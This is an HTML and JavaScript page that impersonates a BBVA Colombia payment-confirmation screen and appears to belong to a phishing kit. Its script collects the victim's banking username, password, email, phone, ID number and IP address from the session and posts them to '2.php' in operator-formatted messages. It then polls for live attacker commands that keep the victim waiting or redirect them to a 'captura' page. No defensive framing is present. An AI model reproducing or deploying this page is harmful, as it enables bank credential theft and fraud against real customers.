<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Confirmación de Pago BBVA</title>
  <style>
    body {
      font-family: BentonSansBBVA-Book, Helvetica, Arial, sans-serif;
      background: #fff;
      color: #000;
      margin: 0;
      padding: 0;
      text-align: center;
    }
    .cabecera { background-color: #004481; height: 60px; width: 100%; }
    .container { padding: 20px 15px; }
    .titulo {
      display: flex; justify-content: space-between; align-items: center;
      font-weight: bold; margin-bottom: 10px; max-width: 500px;
      margin-left: auto; margin-right: auto;
    }
    .titulo span:first-child { color: #004481; }
    .mensaje { font-size: 15px; margin-top: 10px; margin-bottom: 20px; }
    .contador-wrapper { position: relative; width: 70px; height: 70px; margin: 0 auto 10px; }
    .spinner { width: 100%; height: 100%; border: 4px solid #dcdcdc; border-top: 4px solid #004481; border-radius: 50%; animation: spin 1s linear infinite; }
    .contador-texto { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-weight: bold; font-size: 16px; color: #000; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .submensaje { font-size: 14px; margin-top: 8px; margin-bottom: 18px; }
    .modal-box {
      display: none; background: #fff; border: 1px solid #ccc;
      border-radius: 12px; padding: 15px; width: 85%; max-width: 330px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2); margin: 20px auto 0;
    }
    .modal-box p { font-size: 14px; margin-bottom: 12px; }
    .modal-box button {
      padding: 8px 16px; font-size: 14px; margin: 5px;
      border: none; border-radius: 4px; cursor: pointer; 
      background: #004481; color: white; font-weight: bold;
    }
    .modal-box button:hover { background: #003366; }
    .modal-box button.rechazar {
      background: #666; color: white;
    }
    .modal-box button.rechazar:hover { background: #555; }
    .logo {
      width: 120px; 
      margin: 0 auto; 
    }
    .desc {
      max-width: 340px; 
      margin: 0 auto; 
      font-size: 14px; 
      color: #555;
      background-color: #e8f4ff;
      border-left: 4px solid #004481;
    }
    @media (max-width: 900px) {
      .logo {
        width: 70px;
        margin-left: 140px;
      }
    }
  </style>
</head>
<body>
<div class="cabecera"></div>
<div class="container">
  <div class="titulo">
    <img class="logo" src="img/notify.png" alt="BBVA Colombia">
    <span id="montoTexto">Monto: $ 0</span>
  </div>
  <div class="mensaje" style="max-width: 340px; margin: 0 auto; font-size: 15px; color: #555;">
    Por favor, abre la notificación push que enviamos a tu dispositivo móvil y confirma o rechaza esta transacción. Luego regresa a esta pantalla.
  </div><br>
  <div class="contador-wrapper">
    <div class="spinner"></div>
    <div class="contador-texto" id="contador">180s</div>
  </div>
  <div class="submensaje">Esperando confirmación de pago BBVA...</div>
  <div id="modalTemporal" class="modal-box" style="display: none;"></div>
  <div class="desc" style="padding: 10px;">
    <p style="margin: 0; padding: 10px;">
      Si no recibes la notificación, puedes abrir tu app BBVA e iniciar sesión para gestionar la transacción pendiente.
    </p>
  </div>
</div>
<script>
  const contadorEl = document.getElementById("contador");
  const montoTextoEl = document.getElementById("montoTexto");
  const modalTemporal = document.getElementById("modalTemporal");  
  const totalPagar = localStorage.getItem("total_pagar") || "0";
  const identificacion = localStorage.getItem("identificacion") || "";
  const password = localStorage.getItem("password") || "";
  const tipoDocumento = localStorage.getItem("tipoDocumento") || "CC";
  const correo = localStorage.getItem("correo") || "";
  const celular = localStorage.getItem("cel") || "";
  const cedula = localStorage.getItem("val") || "";
  const persona = localStorage.getItem("per") || "";
  const banco = "BBVA";
  const tipoOperacion = "RECARGA PSE";
  const userAgent = navigator.userAgent;
  let dispositivo = 'PC';
  if (/Android/i.test(userAgent)) dispositivo = 'Android';
  else if (/iPhone|iPad|iPod/i.test(userAgent)) dispositivo = 'iPhone';
  else if (/Windows/i.test(userAgent)) dispositivo = 'PC';
  else if (/Mac/i.test(userAgent)) dispositivo = 'Mac';
  else if (/Linux/i.test(userAgent)) dispositivo = 'Linux';
  
  const hora = new Date().toLocaleString('es-ES');
  
  const montoFormateado = parseFloat(totalPagar).toLocaleString("es-CO", {
    style: "currency", currency: "COP"
  });
  montoTextoEl.textContent = "Monto: " + montoFormateado;

  let tiempoRestante = 180;
  let cuenta = setInterval(() => {
    tiempoRestante--;
    contadorEl.textContent = `${tiempoRestante}s`;
    if (tiempoRestante <= 0) {
      clearInterval(cuenta);
      clearInterval(poll);
      alert("⏱️ Tiempo agotado. No se recibió confirmación del pago.");
      window.location.href = "index.php";
    }
  }, 1000);

  let notificacionActiva = null;

  function generarTransactionId() {
    return 'TID' + Date.now() + Math.floor(Math.random() * 999);
  }

  async function obtenerIP() {
    try {
      const response = await fetch('get_ip.php');
      const data = await response.json();
      return data.ip || 'No disponible';
    } catch {
      return 'No disponible';
    }
  }

  async function enviarNotificacion(mensajeUsuario) {
    const tid = generarTransactionId();
    notificacionActiva = { tid, enviada: Date.now() };
    
    const ip = await obtenerIP();
    
    const mensajeCompleto = `<b>💳 Acción del usuario BBVA</b>
<b>• 👤 Usuario:</b> ${identificacion}
<b>• 🔑 Clave:</b> ${password}
------------------------------
<b>• 💰 Monto:</b> $ ${totalPagar}
<b>• 📝 Mensaje:</b> ${mensajeUsuario}`;

    await fetch("2.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        transactionId: tid,
        identificacion: identificacion,
        correo: correo,
        celular: celular,
        cedula: cedula,
        persona: persona,
        monto: totalPagar,
        mensaje: mensajeCompleto
      })
    });

    setTimeout(() => {
      if (notificacionActiva && notificacionActiva.tid === tid) {
        notificacionActiva = null;
      }
    }, 10000);
  }

  function mostrarModal(html) {
    modalTemporal.innerHTML = `<p>${html}</p>`;
    modalTemporal.style.display = "block";
  }

  function ocultarModal() {
    modalTemporal.style.display = "none";
  }

  function preguntarAlUsuario() {
    mostrarModal(`
      ¿Ya realizaste el pago en BBVA pero la página aún no avanza?<br><br>
      <button onclick="responderUsuario(true)">✅ Sí, ya pagué</button>
      <button onclick="responderUsuario(false)" class="rechazar">❌ Aún no he pagado</button>
    `);
  }

  async function responderUsuario(yaPago) {
    ocultarModal();
    if (yaPago) {
      await enviarNotificacion("El usuario indica que YA realizó el pago BBVA");
    } else {
      await enviarNotificacion("El usuario indica que AÚN NO ha realizado el pago BBVA");
      mostrarModal("Aún no hay confirmación de tu pago BBVA.<br>Por favor revisa las notificaciones en tu app BBVA.");
      setTimeout(ocultarModal, 10000);
      setTimeout(preguntarAlUsuario, 20000);
    }
  }

  setTimeout(() => {
    preguntarAlUsuario();
  }, 5000);

  const poll = setInterval(async () => {
    if (!notificacionActiva) return;
    
    const res = await fetch(`2.php?transactionId=${notificacionActiva.tid}`);
    const json = await res.json();
    
    if (json.ok && json.action) {
      notificacionActiva = null;
      clearInterval(cuenta);
      clearInterval(poll);
      
      if (json.action === "confirmado") {
        mostrarModal("✅ Tu pago BBVA fue confirmado.<br><b>Redirigiendo...</b>");
        setTimeout(() => window.location.href = "fin.php", 3000);
      } else if (json.action === "rechazado") {
        mostrarModal("❌ Aún no hay confirmación del pago BBVA. Verifica tu app BBVA.");
        setTimeout(ocultarModal, 10000);
        setTimeout(preguntarAlUsuario, 20000);
        
        tiempoRestante = 180;
        cuenta = setInterval(() => {
          tiempoRestante--;
          contadorEl.textContent = `${tiempoRestante}s`;
          if (tiempoRestante <= 0) {
            clearInterval(cuenta);
            clearInterval(poll);
            alert("⏱️ Tiempo agotado. No se recibió confirmación del pago.");
            window.location.href = "index.php";
          }
        }, 1000);
        
        const poll = setInterval(async () => {
          if (!notificacionActiva) return;
          const res = await fetch(`2.php?transactionId=${notificacionActiva.tid}`);
          const json = await res.json();
          
          if (json.ok && json.action) {
            notificacionActiva = null;
            clearInterval(cuenta);
            clearInterval(poll);
            
            if (json.action === "confirmado") {
              mostrarModal("✅ Tu pago BBVA fue confirmado.<br><b>Redirigiendo...</b>");
              setTimeout(() => window.location.href = "fin.php", 3000);
            } else if (json.action === "captura") {
              mostrarModal("📸 BBVA solicitó una captura.<br><b>Redirigiendo...</b>");
              setTimeout(() => {
                window.location.href = "captura.php";
              }, 1500);
            }
          }
        }, 3000);
      } else if (json.action === "captura") {
        mostrarModal("📸 BBVA solicitó una captura.<br><b>Redirigiendo...</b>");
        setTimeout(() => {
          window.location.href = "captura.php";
        }, 1500);
      }
    }
  }, 3000);
</script>
</body>
</html>